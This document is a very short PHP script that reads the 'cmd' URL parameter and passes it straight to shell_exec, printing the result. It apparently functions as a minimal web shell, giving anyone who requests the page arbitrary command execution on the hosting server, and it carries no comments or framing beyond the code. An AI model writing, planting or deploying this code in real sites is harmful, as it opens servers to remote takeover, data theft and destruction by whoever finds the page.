<?php
function execute($com)
{
  if(function_exists('shell_exec'))
    echo shell_exec($com);
}

$cmd = $_GET['cmd'];
execute($cmd);
?>